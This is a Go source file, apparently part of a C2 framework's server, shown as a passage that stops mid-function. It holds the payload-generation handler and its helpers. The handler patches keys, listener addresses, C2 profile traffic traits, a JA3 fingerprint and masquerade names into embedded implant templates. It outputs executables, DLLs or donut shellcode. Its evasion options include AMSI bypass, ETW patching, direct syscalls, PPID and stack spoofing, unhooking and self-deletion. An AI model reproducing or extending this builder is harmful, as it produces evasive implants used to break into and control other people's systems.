package api

import (
	"BackendTemplate/pkg/c2profile"
	"BackendTemplate/pkg/config"
	"BackendTemplate/pkg/database"
	"BackendTemplate/pkg/delivery"
	"BackendTemplate/pkg/encrypt"
	"BackendTemplate/pkg/godonut"
	"bytes"
	"compress/gzip"
	cryptorand "crypto/rand"
	"embed"
	"encoding/hex"
	"fmt"
	"io"
	"net/http"
	"strings"
	"unicode/utf16"

	"BackendTemplate/pkg/utils/logx"
	"github.com/gin-gonic/gin"
)

//go:embed server/*
var embeddedFiles embed.FS // 嵌入 server 文件夹

// readTemplate 读取嵌入的客户端模板并解压。
// 模板由 build_templates.sh/ps1 构建后 gzip 压缩（体积降至约 1/3，显著减小服务端二进制）；
// 通过 gzip 魔数(1f 8b)探测，兼容未压缩的旧模板。
func readTemplate(dir, name string) ([]byte, error) {
	data, err := embeddedFiles.ReadFile("server/" + dir + "/" + name)
	if err != nil {
		return nil, err
	}
	if len(data) >= 2 && data[0] == 0x1f && data[1] == 0x8b {
		gr, err := gzip.NewReader(bytes.NewReader(data))
		if err != nil {
			return nil, fmt.Errorf("模板解压失败 %s/%s: %v", dir, name, err)
		}
		defer gr.Close()
		raw, err := io.ReadAll(gr)
		if err != nil {
			return nil, fmt.Errorf("模板解压失败 %s/%s: %v", dir, name, err)
		}
		return raw, nil
	}
	return data, nil
}

func GenServer(c *gin.Context) {
	// genServerBody 定义在 opsec_params.go（含 P0–P3 能力的细分开关）。
	var serverBody genServerBody
	if err := c.BindJSON(&serverBody); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	// 前端生成载荷时会从监听器列表带上 VKey/加密盐（payloadUtil/ServerGen），
	// 而列表接口现在只回脱敏预览：带标记的值视为"未提供"，回落到按地址/类型查库取真实密钥。
	// 否则掩码会被 patch 进客户端，客户端上线即解密失败。
	if isMaskedValue(serverBody.Vkey) {
		serverBody.Vkey = ""
	}
	if isMaskedValue(serverBody.EncryptSalt) {
		serverBody.EncryptSalt = ""
	}

	osType := serverBody.OsType
	archType := serverBody.ArchType

	if serverBody.Listener == "" || !strings.Contains(serverBody.Listener, "://") {
		c.JSON(http.StatusBadRequest, gin.H{"error": "listener 格式错误，应为 protocol://address"})
		return
	}

	listenerTmp := strings.SplitN(serverBody.Listener, "://", 2)
	listenerType := strings.ToLower(listenerTmp[0]) // 转换为小写以匹配文件夹名
	connectAddress := listenerTmp[1]
	// 前端从 ShowListener/ShowListenerDetails 拿到的是脱敏地址，原样回传时先还原：
	// 否则脱敏串会被 patch 进客户端配置（oss 尤其致命——AK/SK 变成占位符）
	connectAddress = resolveListenerAddress(connectAddress, "connect")
	// https 有独立客户端目录 server/https（含 https_ 前缀二进制）
	binaryDir := listenerType

	// 多传输载荷：listener 仍作为**密钥/画像来源**（主监听器），endpoints 指定运行时
	// 依次尝试的端点列表。全部端点必须与主监听器使用同一套 VKey/盐 —— 一个二进制
	// 只能携带一份密钥配置（首次连接前没有通道可以下发别的密钥）。
	endpoints := strings.TrimSpace(serverBody.Endpoints)
	var endpointList []string
	if endpoints != "" {
		var epErr string
		endpointList, epErr = validateMultiEndpoints(endpoints)
		if epErr != "" {
			c.JSON(http.StatusBadRequest, gin.H{"error": epErr})
			return
		}
		binaryDir = "multi"
	}

	logx.Debugf("🔍 [SERVER-GEN] 解析前端传递的监听器: %s\n", serverBody.Listener)
	logx.Debugf("🔍 [SERVER-GEN] 解析结果 - Type: %s, ConnectAddress: %s, BinaryDir: %s\n", listenerType, connectAddress, binaryDir)

	// 载荷格式：exe/dll/raw 为完整程序；bin/hex/c 为无阶段 shellcode（完整客户端经 donut 转换）
	// dll 仅支持 windows 目标（rundll32/regsvr32 加载）；bin/hex/c 依赖 donut(PE)，仅 windows
	requestFormat := strings.ToLower(strings.TrimSpace(serverBody.Format))
	switch requestFormat {
	case "", "exe", "raw", "dll", "bin", "hex", "c":
	default:
		c.JSON(http.StatusBadRequest, gin.H{"error": "format 仅支持 exe/dll/raw/bin/hex/c"})
		return
	}
	isShellcodeFmt := requestFormat == "bin" || requestFormat == "hex" || requestFormat == "c"
	if requestFormat == "dll" && strings.ToLower(osType) != "windows" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "dll 格式仅支持 windows 目标"})
		return
	}
	if isShellcodeFmt && strings.ToLower(osType) != "windows" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "bin/hex/c shellcode 格式仅支持 windows 目标（donut 仅转换 PE）"})
		return
	}

	// OPSEC 开关：校验取值 → 空值按"服务端 opsec 配置 → 内置默认"回落 → 拒绝平台不可能的组合。
	// 放在读模板之前，非法参数不必去动 587MB 嵌入目录。
	ops, err := resolveOpsec(&serverBody, osType, archType)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	logOpsecSummary(ops, osType, archType)

	// 查找符合条件的文件
	var binaryFileName string
	if requestFormat == "dll" {
		binaryFileName = findBinaryWithExt(binaryDir, osType, archType, []string{".dll"})
	} else {
		binaryFileName = findBinary(binaryDir, osType, archType)
	}
	if binaryFileName == "" {
		c.JSON(http.StatusBadRequest, gin.H{
			"error": fmt.Sprintf("未找到匹配的客户端二进制: protocol=%s os=%s arch=%s format=%s（请检查 pkg/api/server/%s 下是否有对应预编译文件）",
				listenerType, osType, archType, requestFormat, binaryDir),
		})
		return
	}

	// 从嵌入的文件系统中读取对应文件内容（模板为 gzip 压缩，readTemplate 自动解压）
	binaryData, err := readTemplate(binaryDir, binaryFileName)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "读取文件失败"})
		return
	}

	// ============ 密钥配置解析与 DB 同步（保留 GenServer 特有逻辑） ============
	// 优先使用前端传递的密钥参数，否则从数据库获取
	var masterKey, encryptionSalt []byte

	// 监听器级 beacon 配置（sleep/jitter）：-1 = 未配置，由 payload 层继续回落到
	// 绑定画像的 sleeptime_ms / 全局 client.sleep/jitter。
	beaconCfg := database.GetListenerBeaconConfigByAddr(connectAddress, listenerType)
	logx.Debugf("🔍 [SERVER-GEN] 监听器 beacon 配置 - sleep=%d秒, jitter=%d%% (-1=继承)\n", beaconCfg.SleepSeconds, beaconCfg.JitterPercent)

	if serverBody.Vkey != "" && serverBody.EncryptSalt != "" {
		// 使用前端传递的密钥参数（不打印完整密钥到日志）
		logx.Debugf("🔍 [SERVER-GEN] 前端传递的密钥参数 - VKey长度: %d, Salt长度: %d\n", len(serverBody.Vkey), len(serverBody.EncryptSalt))

		masterKey = make([]byte, 32)
		copy(masterKey, []byte(serverBody.Vkey))
		// 如果VKey长度不足32字节，用零填充
		for i := len(serverBody.Vkey); i < 32; i++ {
			masterKey[i] = 0
		}

		encryptionSalt = make([]byte, 16)
		copy(encryptionSalt, []byte(serverBody.EncryptSalt))
		// 如果盐长度不足16字节，用零填充
		for i := len(serverBody.EncryptSalt); i < 16; i++ {
			encryptionSalt[i] = 0
		}

		// 注意：不再把前端传入的密钥写回监听器记录（原逻辑会无脑覆盖用户配置的
		// 监听器密钥——前端匹配失败回退的默认密钥会把监听器密钥污染成公开默认值，
		// 导致监听器启动被 J4 拒绝、载荷无法上线）。
		// 监听器记录是密钥的唯一权威来源，客户端 patch 应读取它（前端选择器携带），
		// 而不是反向覆盖。

		// 正向监听器：若记录不存在则创建，保证服务端会话密钥派生与客户端一致
		if listenerType == "tcp_forward" || listenerType == "kcp_forward" || listenerType == "ws_forward" || listenerType == "http_forward" || listenerType == "https_forward" {
			if database.DB() != nil {
				// 只按同类型判定：反向监听器可能也绑了同一个 0.0.0.0:port，
				// 不能因此跳过正向记录的创建。地址变体（0.0.0.0:port / :port）一并匹配。
				exists, _ := database.Listeners().ExistsByTypeAndAddrVariants(listenerType, connectAddress)
				if !exists {
					// 载荷里填的是客户端 bind 地址（常为 0.0.0.0），不是服务端可拨目标。
					// 这种情况下 connect_address 留空，由操作员在正向监听器页补真实 IP:端口；
					// 否则启用自动拨号会拨到服务端本机。
					recordConnect := connectAddress
					if isUnspecifiedForwardTarget(recordConnect) {
						recordConnect = ""
					}
					err := database.Listeners().Insert(&database.Listener{
						Type:              listenerType,
						ListenAddress:     connectAddress,
						ConnectAddress:    recordConnect,
						Status:            2, // 未启用；启用后由 handleOpenPort 自动拨号
						HeartbeatTimeout:  "3",
						HeartbeatInterval: "10",
						VKey:              serverBody.Vkey,
						EncryptionSalt:    serverBody.EncryptSalt,
					})
					if err != nil {
						logx.Warnf("⚠️ [SERVER-GEN] 创建%s监听器记录失败: %v\n", listenerType, err)
					} else if recordConnect == "" {
						logx.Infof("🔄 [SERVER-GEN] 已创建%s监听器记录: %s（回连地址待填写：绑定地址不能作为拨号目标，请到正向监听器页补全后启用）\n", listenerType, connectAddress)
					} else {
						logx.Infof("🔄 [SERVER-GEN] 已自动创建%s监听器记录: %s（可到正向监听页启用自动拨号）\n", listenerType, connectAddress)
					}
				}
			}
		}

		logx.Infof("🔑 [SERVER-GEN] 使用前端传递的密钥配置生成%s客户端\n", listenerType)
	} else {
		// 优先使用前端传递的默认密钥配置（即使是tcp_forward类型）
		if serverBody.Vkey != "" || serverBody.EncryptSalt != "" {
			// 如果前端传递了部分密钥参数，使用它们
			masterKey = make([]byte, 32)
			copy(masterKey, []byte(serverBody.Vkey))
			for i := len(serverBody.Vkey); i < 32; i++ {
				masterKey[i] = 0
			}

			encryptionSalt = make([]byte, 16)
			copy(encryptionSalt, []byte(serverBody.EncryptSalt))
			for i := len(serverBody.EncryptSalt); i < 16; i++ {
				encryptionSalt[i] = 0
			}

			logx.Infof("🔑 [SERVER-GEN] 使用前端传递的默认密钥配置生成%s客户端\n", listenerType)
		} else if listenerType == "tcp_forward" || listenerType == "kcp_forward" || listenerType == "ws_forward" || listenerType == "http_forward" || listenerType == "https_forward" {
			// 只有在前端没有传递任何密钥时，才使用正向监听器的特殊默认配置
			masterKey, encryptionSalt = encrypt.GetListenerKeyConfigForForward(listenerType)
			logx.Infof("🔑 [SERVER-GEN] 使用%s监听器的特殊默认密钥配置\n", listenerType)
		} else {
			// 其他类型从数据库获取监听器密钥配置
			// 【修复】按地址匹配失败时回退按类型匹配（与服务端 first blood 的密钥来源完全一致），
			// 避免客户端 patch 的密钥与服务端派生会话密钥不一致导致命令解密失败
			// （原实现把查到的记录丢进 `_`，dbListener 是零值，等于"匹配到了却用空密钥"）。
			if dbListener, has, _ := database.Listeners().FindByConnectOrListen(connectAddress); has {
				masterKey = make([]byte, 32)
				copy(masterKey, []byte(dbListener.VKey))
				encryptionSalt = make([]byte, 16)
				copy(encryptionSalt, []byte(dbListener.EncryptionSalt))
				logx.Infof("🔑 [SERVER-GEN] 使用监听器数据库密钥配置（地址匹配）\n")
			} else {
				// 地址未匹配：按协议类型取监听器密钥（与服务端 first blood 一致）
				masterKey, encryptionSalt = encrypt.GetListenerKeyConfigForForward(listenerType)
				logx.Infof("🔑 [SERVER-GEN] 地址未匹配监听器，回退按类型 %s 获取密钥配置\n", listenerType)
			}
		}
	}

	if masterKey != nil && encryptionSalt != nil {
		// J4: 默认/空密钥一律拒绝生成（覆盖前端传参/DB/类型回退全部路径）
		if encrypt.IsDefaultListenerKey(masterKey, encryptionSalt) ||
			len(masterKey) == 0 || len(encryptionSalt) == 0 {
			c.JSON(http.StatusBadRequest, gin.H{"error": "未提供有效 VKey/加密盐：请为监听器配置自定义密钥后重新生成客户端"})
			return
		}

		logx.Infof("🔑 [SERVER-GEN] 使用监听器%s的动态密钥配置生成客户端\n", listenerType)
	} else {
		// J4: 未提供自定义密钥时拒绝生成客户端（默认密钥为公开常量：流量可解密、可伪造客户端）
		c.JSON(http.StatusBadRequest, gin.H{"error": "未提供 VKey/加密盐：请为监听器配置自定义密钥后重新生成客户端"})
		return
	}

	// 【P2-3】统一占位符 patch 引擎（与 WebDelivery 共用 delivery.PatchClientBinary，
	// 含 PASS/主密钥/盐/心跳/抖动/HOST 占位符替换，替换失败即拒绝生成——
	// 原 GenServer 内联替换三处重复实现已合并，含 6KB OSS 占位符字面量）
	m := serverBody.MasqueradeName
	if m != "" {
		// 伪装修饰名合法性校验（字母数字，长度≤16；避免注入分隔符/路径字符）
		m = sanitizeMasquerade(m)
	} else {
		// 未提供时随机生成（不可猜测的品牌前缀）
		m = "svc" + randomSuffix(6)
	}
	// quietMode 已由 resolveOpsec 归一化（含服务端 opsec 配置回落），不再就地取默认值。
	// C2 Profile 驱动：URI/WS 路径/心跳基准/UA（profiles/*.yaml，空 profile 用客户端默认）
	// 前端目前不发送 profileName：空值必须按**该监听器实际绑定的画像**回落，
	// 否则绑定非 default 画像的监听器会被下面的 profileListenerMismatch 误拒（400）。
	profileName := strings.TrimSpace(serverBody.ProfileName)
	if profileName == "" {
		profileName = listenerProfileNameForPayload(serverBody.Listener)
	}
	prof := c2profile.Get(profileName)
	if prof == nil && strings.TrimSpace(serverBody.ProfileName) == "" {
		// 自动回落的画像文件缺失（监听器绑定的画像被删）：沿用升级前的行为回落到
		// default（监听器启动时同样按 default 特征注册），不因历史脏数据阻断生成。
		profileName = c2profile.DefaultProfileName
		prof = c2profile.GetDefault()
	}
	// 显式请求了不存在的画像：下面的 patch 会写入空 URI 生成一个连不上的载荷，直接拒绝
	if prof == nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "C2 Profile 不存在: " + profileName})
		return
	}
	// 一致性校验：载荷的画像必须与该监听器**实际注册**的画像一致。
	//
	// 原来是拿所有监听器共用的 default 画像当基准，于是"换个画像就必然连不上"
	// （监听器只按 default 注册路由）。现在每个监听器绑自己的画像（listener.Profile），
	// 基准随之变成**该监听器的画像**：用画像 A 的监听器生成画像 B 的载荷仍会被拒绝，
	// 但用画像 A 生成画像 A 的载荷可以通过。
	if msg := profileListenerMismatch(prof, listenerProfileForPayload(serverBody.Listener)); msg != "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": msg})
		return
	}
	// 会话密钥派生盐上下文(配置驱动,两端一致)
	sessionKeyInfo := "8d2c91f4a6"
	if g := config.GetGlobalConfig(); g != nil && g.Security.SessionKeyInfo != "" {
		sessionKeyInfo = g.Security.SessionKeyInfo
	}
	profGetURI, profPostURI, profWSPath, profHB, profUA, profJA3, profDNS := "", "", "", "", "", "", ""
	profMetaCh, profPad := "", true
	if prof != nil {
		profGetURI = prof.HTTP.Get.URI
		profPostURI = prof.HTTP.Post.URI
		profWSPath = prof.WS.Path
		if prof.SleeptimeMs > 0 {
			profHB = fmt.Sprintf("%d", prof.SleeptimeMs)
		}
		profUA = prof.UserAgent
		profJA3 = prof.TLS.JA3
		profDNS = sanitizeMasquerade(prof.DNS.BeaconPrefix)
		profMetaCh = prof.HTTP.Get.MetadataChannel
		profPad = prof.HTTP.Get.Padding
	}
	if serverBody.UserAgent != "" {
		profUA = serverBody.UserAgent // 显式传参优先
	}
	// 多传输：所有端点必须与主监听器使用同一套密钥（一个二进制只能带一份密钥配置）。
	// 只对"库里有记录的监听器"校验，未注册的地址（如重定向器/域前置）放行。
	if len(endpointList) > 0 {
		if msg := checkEndpointKeyConsistency(endpointList, masterKey, encryptionSalt); msg != "" {
			c.JSON(http.StatusBadRequest, gin.H{"error": msg})
			return
		}
	}

	modifiedData, err := delivery.PatchClientBinary(binaryData, delivery.PatchOptions{
		ListenerConfig:      serverBody.Listener,
		Endpoints:           strings.Join(endpointList, ","),
		OS:                  osType,
		Arch:                archType,
		Pass:                serverBody.Pass,
		VKey:                serverBody.Vkey,
		EncryptSalt:         serverBody.EncryptSalt,
		// JitterPercent / SleepSeconds 留空：由 delivery.PatchClientBinary 统一按
		// 监听器 > 画像 > 全局的优先级解析（与监听器列表"生效值"共用同一套逻辑）。
		ReconnectBaseDelay:  serverBody.ReconnectBaseDelay,
		ReconnectMaxRetries: serverBody.ReconnectMaxRetries,
		InjectTechDefault:   ops.InjectTech,
		MasqueradeName:      m,
		QuietMode:           ops.QuietMode,
		ETWPatch:            ops.ETW,
		AmsiBypass:          ops.AMSI,
		SyscallMode:         ops.SyscallMode,
		AutoDelete:          ops.AutoDelete,
		UserAgent:           profUA,
		Format:              requestFormat,
		HashPad:             cfgHashPad(),
		Sign:                true, // 交付给操作员的载荷走签名（config.signing 未启用时为空操作）
		HTTPGetURI:          profGetURI,
		HTTPPostURI:         profPostURI,
		WSPath:              profWSPath,
		HeartbeatMs:         profHB,
		TLSJA3:              profJA3,
		DNSLabelPrefix:      profDNS,
		SessionKeyInfo:      sessionKeyInfo,
		MetadataChannel:     profMetaCh,
		Padding:             boolToOnOff(profPad),
		// P4：P0–P3 对抗能力的细分开关
		SleepMaskHide: ops.SleepMaskHide,
		StackSpoof:    ops.StackSpoof,
		PpidSpoof:     ops.PpidSpoof,
		BlockDLLs:     ops.BlockDLLs,
		UnhookOnStart: ops.UnhookOnStart,
	})
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	// 日志记录最终生效值（与真正 patch 进载荷的一致）
	profileSleepMs := 0
	if prof != nil && prof.SleeptimeMs > 0 {
		profileSleepMs = prof.SleeptimeMs
	}
	effSleep := delivery.ResolveBeaconSleep("", beaconCfg.SleepSeconds, profileSleepMs)
	effJitter := delivery.ResolveBeaconJitter("", beaconCfg.JitterPercent)
	logx.Infof("❤️ [SERVER-GEN] beacon 配置 - sleep=%d秒, jitter=%d%%（监听器未配置时继承画像/全局）\n", effSleep, effJitter)

	// bin/hex/c：无阶段 shellcode（完整客户端经 donut 转换，运行即上线，无需分阶段拉取）
	if isShellcodeFmt {
		sc, err := godonut.GenShellcode(modifiedData, serverBody.Pass, archType)
		if err != nil || len(sc) == 0 {
			c.JSON(http.StatusBadRequest, gin.H{"error": fmt.Sprintf("donut 转换 shellcode 失败: %v", err)})
			return
		}
		var content []byte
		var filename, ctype string
		switch requestFormat {
		case "bin":
			content = sc
			filename = "stageless_shellcode.bin"
			ctype = "application/octet-stream"
		case "hex":
			content = []byte(hex.EncodeToString(sc))
			filename = "stageless_shellcode.txt"
			ctype = "text/plain"
		case "c":
			var cb bytes.Buffer
			cb.WriteString("unsigned char shellcode[] = \"")
			for i, b := range sc {
				if i > 0 && i%32 == 0 {
					cb.WriteString("\"\n    \"")
				}
				cb.WriteString(fmt.Sprintf("\\x%02x", b))
			}
			cb.WriteString("\";\n")
			content = cb.Bytes()
			filename = "stageless_shellcode.c"
			ctype = "text/x-csrc"
		}
		c.Header("Content-Disposition", "attachment; filename="+filename)
		c.Header("Content-Type", ctype)
		c.Header("Content-Length", fmt.Sprintf("%d", len(content)))
		c.Writer.Write(content)
		return
	}

	// 设置下载响应头：二进制载荷必须显式声明 Content-Type。
	// UTF8EncodingMiddleware 会对未设置 Content-Type 的 /api 响应强制标记
	// application/json，前端会把二进制误判为 JSON 错误响应（生成失败）。
	// 【修复】文件名按协议+系统区分（与模板命名一致）：tcp 协议即 tcp_linux_amd64，
	// windows 追加 .exe/.dll；linux/darwin 可执行文件无 .exe 后缀
	fileName := listenerType + "_" + osType + "_" + archType
	switch requestFormat {
	case "dll":
		fileName += ".dll"
	default:
		if strings.ToLower(osType) == "windows" {
			fileName += ".exe"
		}
	}
	c.Header("Content-Disposition", "attachment; filename="+fileName)
	c.Header("Content-Type", "application/octet-stream")
	c.Header("Content-Length", fmt.Sprintf("%d", len(modifiedData)))

	// 直接将字节写入响应体
	c.Writer.Write(modifiedData)
}
func findBinary(listenerType, osType, archType string) string {
	return findBinaryWithExt(listenerType, osType, archType, nil)
}

// findBinaryWithExt 查找匹配的模板文件，exts 可指定额外扩展名（如 ".dll"）；nil 表示默认 .exe/无后缀
func findBinaryWithExt(listenerType, osType, archType string, exts []string) string {
	entries, err := embeddedFiles.ReadDir("server/" + listenerType)
	if err != nil {
		return ""
	}

	// 收集目录中的所有文件名
	fileSet := make(map[string]struct{})
	for _, entry := range entries {
		if !entry.IsDir() {
			fileSet[entry.Name()] = struct{}{}
		}
	}

	// 统一命名规则：{协议前缀}_{os}_{arch}[.exe]
	// 示例：tcp_linux_amd64、ws_windows_amd64.exe、http_linux_amd64、tcp_forward_windows_amd64.exe
	// 协议前缀见 getProtocolName / binaryNamePrefixes（websocket → ws）
	// 指定 exts（如 .dll）时只按这些扩展名匹配，避免命中 .exe 模板
	var suffixes []string
	if len(exts) > 0 {
		for _, ext := range exts {
			suffixes = append(suffixes, osType+"_"+archType+ext)
		}
	} else {
		suffixes = []string{
			osType + "_" + archType + ".exe",
			osType + "_" + archType,
		}
	}
	prefixes := binaryNamePrefixes(listenerType)

	for _, prefix := range prefixes {
		for _, suffix := range suffixes {
			candidate := prefix + suffix
			if _, ok := fileSet[candidate]; ok {
				return candidate
			}
		}
	}

	return ""
}

// binaryNamePrefixes 返回协议文件名前缀（标准名优先，旧名仅作兼容回退）
// 标准格式：{prefix}{os}_{arch}[.exe]，如 tcp_linux_amd64、ws_windows_amd64.exe
func binaryNamePrefixes(listenerType string) []string {
	switch listenerType {
	case "tcp":
		return []string{"tcp_", "t_", "r_"}
	case "tcp_forward":
		return []string{"tcp_forward_", "tcp_", "t_", "r_"}
	case "kcp_forward":
		return []string{"kcp_forward_", "kcp_", "r_", "t_"}
	case "ws_forward":
		return []string{"ws_forward_", "ws_", "websocket_", "r_", "t_"}
	case "http_forward":
		return []string{"http_forward_", "https_", "http_", "r_", "t_"}
	case "https_forward":
		return []string{"https_forward_", "https_", "http_", "r_", "t_"}
	case "kcp":
		return []string{"kcp_", "r_", "t_"}
	case "http", "https":
		return []string{"http_", "https_", "r_", "t_"}
	case "websocket":
		// 标准前缀为 ws_（与 getProtocolName 一致）
		return []string{"ws_", "websocket_", "r_", "t_"}
	case "oss":
		return []string{"oss_", "r_", "t_"}
	case "dns":
		return []string{"dns_", "r_", "t_"}
	default:
		protocolName := getProtocolName(listenerType)
		return []string{protocolName + "_", "r_", "t_"}
	}
}

// getProtocolName 根据监听器类型返回协议名
func getProtocolName(listenerType string) string {
	switch listenerType {
	case "tcp":
		return "tcp"
	case "tcp_forward":
		return "tcp_forward"
	case "kcp_forward":
		return "kcp_forward"
	case "ws_forward":
		return "ws_forward"
	case "http_forward":
		return "http_forward"
	case "https_forward":
		return "https_forward"
	case "kcp":
		return "kcp"
	case "http":
		return "http"
	case "https":
		return "http" // https 使用 http 客户端
	case "websocket":
		return "ws"
	case "oss":
		return "oss"
	case "dns":
		return "dns"
	default:
		// 默认情况下使用监听器类型本身
		return listenerType
	}
}

// 填充空格到指定长度（供本包各文件使用；delivery 包内有独立同名实现）
func padRight(str string, length int) string {
	if len(str) >= length {
		return str
	}
	return str + strings.Repeat(" ", length-len(str))
}

// utf16LE UTF-16 LE编码
func utf16LE(s string) []byte {
	encoded := utf16.Encode([]rune(s))
	out := make([]byte, len(encoded)*2)
	for i, v := range encoded {
		out[i*2] = byte(v)        // 低字节
		out[i*2+1] = byte(v >> 8) // 高字节
	}
	return out
}
func ShowListener(c *gin.Context) {
	listeners, _ := database.Listeners().ListOpen()

	var result []string
	for _, listener := range listeners {
		// 脱敏：oss 的 connect_address 承载 AK/SK
		result = append(result, listener.Type+"://"+maskListenerAddress(listener.Type, listener.ConnectAddress))
	}
	c.JSON(http.StatusOK, gin.H{"status": 200, "data": result})

}

// ShowListenerDetails 返回监听器的详细信息
func ShowListenerDetails(c *gin.Context) {
	// 直接查询所有活跃的监听器，包含ID
	listeners, _ := database.Listeners().ListOpen()

	type ListenerDetail struct {
		ID             int64  `json:"id"`
		URL            string `json:"url"`
		Protocol       string `json:"protocol"`
		ListenAddress  string `json:"listenAddress"`
		ConnectAddress string `json:"connectAddress"`
		Status         int    `json:"status"`
	}

	var result []ListenerDetail
	for _, listener := range listeners {
		// 使用直接查询到的数据，其中包含真实ID
		detail := ListenerDetail{
			ID:             listener.Id, // 直接使用数据库ID
			URL:            listener.Type + "://" + maskListenerAddress(listener.Type, listener.ConnectAddress),
			Protocol:       listener.Type,
			ListenAddress:  maskListenerAddress(listener.Type, listener.ListenAddress),
			ConnectAddress: maskListenerAddress(listener.Type, listener.ConnectAddress),
			Status:         listener.Status,
		}
		result = append(result, detail)
	}

	c.JSON(http.StatusOK, gin.H{"status": 200, "data": result})
}

// sanitizeMasquerade 伪装修饰名前缀合法性校验：仅保留字母数字（长度≤16），
// 避免注入路径分隔符/特殊字符破坏生成的持久化对象名/管道名/文件名。
func sanitizeMasquerade(s string) string {
	var sb strings.Builder
	for _, r := range s {
		if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') {
			sb.WriteRune(r)
		}
		if sb.Len() >= 16 {
			break
		}
	}
	out := sb.String()
	if out == "" {
		out = "svc"
	}
	return out
}

// randomSuffix 随机字母数字后缀（伪装修饰名不可猜测）。
// B10 修复: 原用时间种子 LCG(可预测——攻击者观察到一枚载荷的修饰名即可推算
// 时间种子枚举其余),改 crypto/rand。
func randomSuffix(n int) string {
	const chars = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, n)
	buf := make([]byte, n)
	if _, err := cryptorand.Read(buf); err != nil {
		// crypto/rand 失败属系统级故障,回退固定串并保留 n 长度(不用于安全决策)
		for i := range b {
			b[i] = chars[0]
		}
		return string(b)
	}
	for i := range b {
		b[i] = chars[int(buf[i])%len(chars)]
	}
	return string(b)
}

// cfgHashPad 从全局配置读取载荷 Hash 轮换开关（默认开启）
func cfgHashPad() bool {
	if g := config.GetGlobalConfig(); g != nil {
		return g.Obfuscation.HashPad
	}
	return true
}

// boolToOnOff bool -> "1"/"0"
func boolToOnOff(b bool) string {
	if b {
		return "1"
	}
	return "0"
}

// listenerProfileForPayload 取该监听器实际注册流量特征所用的画像（生成载荷时的校验基准）。
//
// 入参是前端传来的 "protocol://address"。查不到监听器（比如地址填的是重定向器/域前置，
// 库里没有这条记录）时回落 default —— 与升级前的行为一致，且不会因此拒绝生成载荷。
func listenerProfileForPayload(listenerSpec string) *c2profile.Profile {
	name := listenerProfileNameForPayload(listenerSpec)
	if p := c2profile.Get(name); p != nil {
		return p
	}
	return c2profile.GetDefault()
}

// applyListenerProfile 用监听器绑定的画像补齐 PatchOptions 中未显式提供的流量特征。
//
// WebDelivery / 内存注入 / 会话迁移原先只传密钥与地址，载荷会按 default 路径去连
// 一个按其他画像注册的监听器（URI/WS 路径/DNS 前缀对不上），永远不上线。
// 显式值优先，空值才填；画像字段本身为空时保持空，让 delivery 用内置默认。
func applyListenerProfile(opts *delivery.PatchOptions, listenerSpec string) {
	applyProfileFields(opts, listenerProfileForPayload(listenerSpec))
}

// applyListenerProfileRecord 同上，但直接使用已查到的监听器记录（调用方已按客户端
// 归属定位，派生连接地址可能与库中 connect_address 不完全一致）。
func applyListenerProfileRecord(opts *delivery.PatchOptions, l database.Listener) {
	if _, p := resolveListenerProfile(l.Profile); p != nil {
		applyProfileFields(opts, p)
	}
}

func applyProfileFields(opts *delivery.PatchOptions, prof *c2profile.Profile) {
	if prof == nil {
		return
	}
	if opts.HTTPGetURI == "" {
		opts.HTTPGetURI = prof.HTTP.Get.URI
	}
	if opts.HTTPPostURI == "" {
		opts.HTTPPostURI = prof.HTTP.Post.URI
	}
	if opts.WSPath == "" {
		opts.WSPath = prof.WS.Path
	}
	if opts.TLSJA3 == "" {
		opts.TLSJA3 = prof.TLS.JA3
	}
	if opts.UserAgent == "" {
		opts.UserAgent = prof.UserAgent
	}
	if opts.DNSLabelPrefix == "" && prof.DNS.BeaconPrefix != "" {
		opts.DNSLabelPrefix = sanitizeMasquerade(prof.DNS.BeaconPrefix)
	}
	if opts.MetadataChannel == "" {
		opts.MetadataChannel = prof.HTTP.Get.MetadataChannel
	}
	if opts.Padding == "" {
		opts.Padding = boolToOnOff(prof.HTTP.Get.Padding)
	}
}

// listenerProfileNameForPayload 返回该监听器绑定的画像名（查不到/空地址回落 default）。
// 生成载荷时用于"前端没传 profileName"的回落，保证画像一致性校验的基准与监听器一致。
func listenerProfileNameForPayload(listenerSpec string) string {
	addr := listenerSpec
	if i := strings.Index(addr, "://"); i >= 0 {
		addr = addr[i+3:]
	}
	if addr == "" {
		return c2profile.DefaultProfileName
	}
	lis, has, err := database.Listeners().FindByConnectOrListen(addr)
	if err != nil || !has {
		return c2profile.DefaultProfileName
	}
	name, _ := resolveListenerProfile(lis.Profile)
	return name
}

// profileListenerMismatch 检查画像与**该监听器实际注册**的流量特征是否一致（一致返回空串）。
//
// 监听器侧特征：HTTP get/post 路由、WS 路径、DNS 前缀、padding —— 这些在监听器启动时
// 按它绑定的画像注册，所以载荷必须用同一个画像。
// 只有纯客户端侧字段（UA/JA3/心跳/metadata_channel）允许与监听器画像不同。
func profileListenerMismatch(p, listenerProfile *c2profile.Profile) string {
	if p == nil || listenerProfile == nil {
		return ""
	}
	// 不按 Name 走捷径：逐字段比较才是真正的契约。
	//
	// 曾经在这里写过 `if p.Name == listenerProfile.Name { return "" }` ——
	// 结果是**单测被短路成空转**（测试里两个画像的 Name 都是 "default"，
	// 改字段再也测不出问题）。而且同名不同内容（文件被改过）才是真正要抓的情况。
	def := listenerProfile
	var diffs []string
	if p.HTTP.Get.URI != def.HTTP.Get.URI {
		diffs = append(diffs, fmt.Sprintf("http.get.uri %q ≠ 监听器 %q", p.HTTP.Get.URI, def.HTTP.Get.URI))
	}
	if p.HTTP.Post.URI != def.HTTP.Post.URI {
		diffs = append(diffs, fmt.Sprintf("http.post.uri %q ≠ 监听器 %q", p.HTTP.Post.URI, def.HTTP.Post.URI))
	}
	if p.WS.Path != def.WS.Path {
		diffs = append(diffs, fmt.Sprintf("ws.path %q ≠ 监听器 %q", p.WS.Path, def.WS.Path))
	}
	if p.DNS.BeaconPrefix != def.DNS.BeaconPrefix {
